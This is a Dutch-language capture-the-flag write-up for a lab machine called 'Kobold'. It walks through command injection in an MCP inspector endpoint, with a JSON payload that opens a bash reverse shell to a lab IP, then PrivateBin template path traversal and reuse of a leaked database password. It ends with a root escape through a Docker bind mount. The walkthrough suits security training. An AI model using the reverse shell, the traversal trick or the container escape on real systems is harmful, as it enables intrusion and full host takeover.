# Kobold

De hoofdpagina toont niks spannends, zijn wel referenties dat het om een AI of
agentic onderdeel gaat.

## Enumeratie

De volgende subdomeinen zijn aanwezig:

- bin.kobold.htb
  - Hier draait `privateBin@v2.0.2` op
- mcp.kobold.htb
  - Dit is [mcpjam@v1.4.2](https://github.com/MCPJam/inspector)

Qua poorten valt op dat ook poort `3552` open staat, hier draait
[Arcane@v1.13.0](https://github.com/getarcaneapp/arcane) op. Dit lijkt op een
docker management tool.

## mcp.kobold.htb

We kunnen hier mcp servers toevoegen zonder in te loggen. Hierbij kunnen we het
start commando voor de server aangeven. Als ik een server instel met HTTP
connectie type dan wordt er netjes een call gemaakt naar mijn machine. Het lijkt
er dus op dat we hier een mogelijke command injectie hebben.

Dit verbind in ieder geval netjes met mijn machine:

```
stdio: nc {IP} {PORT}
```

Er is schijnbaar ook een CVE hier, zie [github advisory](https://github.com/advisories/GHSA-232v-j27c-5pp6)

Dit gaat om hetzelfde endpoint die ik vond. Nu nog het juiste commando opbouwen
om een revshell te krijgen.

Uiteindelijk met de volgende payload een revshell te pakken:

```js
// POST /api/mcp/connect

{
    "serverConfig": {
        "timeout": 10000,
        "command": "/bin/bash",
        "args":[
            "-c",
            "/bin/bash -i >& /dev/tcp/10.10.15.185/9001 0>&1"
        ],
        "env":{}
    },
    "serverId": "freckles"
}
```

Hiermee hebben we ook gelijk de user flag te pakken

# Privesc

Op de box hebben we de volgende users:

```
root:x:0:0:root:/root:/bin/bash
ben:x:1001:1001::/home/ben:/bin/bash
alice:x:1002:1002::/home/alice:/bin/bas
```

> We zijn hier als `Ben` ingelogd

We kunnen niet bij de `Alice` user maar met `groups alice` zien we wel dat zij
in de `docker` groep zit. En dus hiermee zouden we root kunnen krijgen.

## Enumeratie

### Poorten

Met `ss -tunlp` vinden we de volgende open poorten

Bound op `0.0.0.0`

- `80/443` nginx
- `3552` Dit is arcane

Bound op `127.0.0.1`

- `6274` MCPJam
- `8080` Dit is privatebin
- `40305` ??
  - Na een restart van de server zit dit op een andere poort. Namelijk 34363
  - Curl geeft terug `404: Page Not Found`

### Arcane

We vinden een arcane service waarin het volgende (_versimpeld_) staat:

```
[Service]
Environment=ENCRYPTION_KEY="Q3PbC9fpq/tPZ2waXI9+grmc8ualF7ITF5izX5rsk+E="
ExecStart=/root/arcane_linux_amd64
```

### Private bin

Het lijkt er op dat we vooral bij de `/privatebin-data` folder kunnen. Hier
vinden we wel in `salt.php` het volgende:

```
<?php # |e14880e2b0533d0b4677364d92af3ed8c796679b0f9cda2ac5516258b976aa64dc79cee416f505fa5790de9e232b1756612ac1a0f0d0d0ea2b1c4af0da621f4a8e44543775dfa0e10dfae682687b4943968ec0da01bfe487710e446acb3d2736dc43c4d916f214666c6a6a198043b0195c5c1c2733b8c89d8d6becff2bd3ca4e7a100b92a3b2fe0beb71a22f6bc62562e4e62d305e8a81877a58e161527a6c110bbf2d95738ab3c651324c92dcf04fe2e1c29a018740dec0063b6c39a5438780d882654a8d138b910fc762e04781bd7e946066da948c8522424990cb3777a904f1c5562f7832b6f7b090a805db5cd0b70bf3a35b3bd2d8b9258cadcea548187e|
```

> _Geen idee wat dit is maar waarschijnlijk kunnen we hiermee data uitlezen van
> andere private bin uploads???_

Verder kijkend denk ik dat we iets moeten met
https://privatebin.info/reports/vulnerability-2025-11-12-templates.html. Nu we
bij de folder kunnen zouden we hier ook eigen bestanden en PHP scripts kunnen
neerzetten. Daarmee kunnen we dan command execution krijgen en dus als de
_privatebin_ user (detail: Ik weet niet welke user dit is) dingen kunnen doen.

Dit lijkt te werken, als ik een php file hier aanmaak en de template waarde van
het cookie aanpas kan ik het voor elkaar krijgen dat dit PHP bestand aangeroepen
wordt. Nu nog de exploit

```toml
# Cookie waarde, dit roept `pwn.php` aan in de data folder. De `.php` wordt
# altijd toegevoegd.
template: "../data/pwn"
```

Met wat testen met het meest onpraktische command script lijkt het er op dat
`privatebin` in een docker container draait. Na toegang gekregen te hebben kom
ik de volgende config tegen

```
[model]
; example of DB configuration for MySQL
; Temporarily disabling while we migrate to new server for loadbalancing
;class = Database
[model_options]
dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
tbl = "privatebin_"    ; table prefix
usr = "privatebin"
pwd = "ComplexP@sswordAdmin1928"
opt[12] = true   ; PDO::ATTR_PERSISTENT
```

> _Dit staat niet in de conf.sample.php op github, dit is dus toegevoegd_

Verder kan ik nu bij de volledige paden in de bestanden:

```
<?php http_response_code(403); /*
{
    "adata": [
        ["sbFU37G6nSk4rcFoN7gPcQ==","WkJ1Lx84uuQ=",100000,256,128,"aes","gcm","zlib"],
        "syntaxhighlighting",0,0
    ],
    "meta":{
        "expire_date":1774793833,
        "salt":"0b51e88f95160538d31fa949dc0b5f8f78b45c899782a8ea71bcef032ade83017df0b2c58464e5aa7995e5990071b12a2e0ed92c7e1c051da069c722b539cd7af4de2b18e82c1622a9373a4d2e2b0655ddedbf081701f6c3f3fda672bf6557b6c3ba84459aa32a666d74ba41d0c22ccc50600c9aa956ed0aa9fa5ad417d411c0ae27fbc719e34f91d34225d4a3b43aadbd5433bbafc649c9f4c08f279f0a725194c5f3f2f3101f7661381a058b11a0024c1351f8c235112352226379e992415012ec9f5350c6fd4802295a0ba07c294d80cfac73beec0d8c1106f88ea0aca88d7922e45d47cdb55116948550e15af30558f8b9c82e6932fda4d138e837661852"
    },"v":2,"ct":"EVAaiDm+ixI\/qoNaZyy5fhS72sOFmLpMqKSjQPMW5KZEciU="
}

cat ./f8/a6/f8a6a35ffb03e297.php
<?php http_response_code(403); /*
{
    "adata":[
        ["md3BsjbZPxzqkzIXHGQaag==","hHz8U4MgzLY=",100000,256,128,"aes","gcm","zlib"],
        "plaintext",0,0
    ],
    "meta":{
        "expire_date":1774796499,
        "salt":"ff2b9753812e34e4e04dc47339d0ad1acc7f36db397b7708f60f6ed41931ce7c74ec7590c42bd8ff0d169a317c19120713d868b320bd144b492dd64541048013481cd718ee09eeca094ea92714859c44a87016ecca90386c58ed7d653e7c07c7daca5a95ceeb8cb02745863015e71d63ff1e3904f7b34c521ca77604779a85f01ff26f28f5bb33acea6d76ae4ad9dc3aced653fd927231e257feecee48da7d11403a97664f8289cacf5321686c0b225b9853b3c60d4d579203d1063ab1f254cfeebc06f63d204338ec95b110ddc9833bd2a5b6b956b7b215b3fb4a28be6416ae39079d48fbe774506fba1c5c0b93dfef6bbda183020ce62f129c53f8be11e36d"
    },"v":2,"ct":"JqEk51RCOwr2z51qGrhqWJBYNGs60wSIvRitFrg1Mdzt"
}

cat ./f2/1e/f21e20e88ea4bf55.php
<?php http_response_code(403); /*
{
    "adata": [
        ["I6UD8Egx5XHB2qzYGX8Fpw==","3bkqyi6CoLc=",100000,256,128,"aes","gcm","zlib"],
        "plaintext",0,0
    ],
    "meta": {
        "expire_date":1774788013,
        "salt":"d4c33f0294904852fa3c5edc5217608380ea62f2b6c22ec37afeb13fea8916ee8a63c39a5868f5b819b928dc9aacf994ae1a64b94a28bbcf8dcc14bbebcf94f931a31a072ef428c8bb94681af7bf2c334c1b71bedd7c48dbde3336a7b52d42a4b48f7de4d66bfc22f13ad7afffd5ad0f2f67c23a4e2374fc63d8ac52c06949fbe029520f4ed6b8f7ec61da1a2e94b449c15a2856e1bd808c704c685d550923fffd16d2a947c1348f4a35ec353886d5333b2b1cdd1fc69712091dde7c68c037a0ea151494d3ea87a07cc16e2f56a1c10f7e376b1b6ed8710de8f0f5f67fd32334cad114104398f16cd8747c01d35286504b2efba8f778850a92171166ac2aab18"
    },"v":2,"ct":"6IkUDLKAiK4vg53Yd2D3mRC56vnKLloVjF2HvxUp\/QKA"
}
```

Dit matched met de URL maar de bestanden hebben wel een decryptor key nodig om
uit te lezen. Hoe ik deze kan bepalen weet ik nog niet.

> Ik heb een mini cheat gedaan. Na het resetten van de server zie ik dat er geen
> bestanden staan in de private bin folder. Kortom het uitlezen van zo'n bestand
> is niet onderdeel van de CTF

### CVE-2026-23944

Dit toont een CVE in arcane maar ik weet nog niet wat ik hiermee kan. Na lang
zoeken heb ik een vervolg stap gevonden. Ik kan op arcane inloggen met:

```
arcane:ComplexP@sswordAdmin1928
```

> _Dit is het password uit de `conf.php` van privatebin_

Binnen arcane zelf zie ik geen _remote environments_ dus de CVE is hier niet van
toepassing.

Wat wel van toepassing is dat er binnen arcane twee docker images aanwezig zijn.
Eentje voor `private bin` en eentje voor `mysql`. Private bin start standaard
als een `nobody` user dus hier kunnen we niet veel mee maar `mysql` draait
standaard als root. Kortom een bind aanmaken op `/` en een shell openen via de
arcane UI en we kunnen alles!
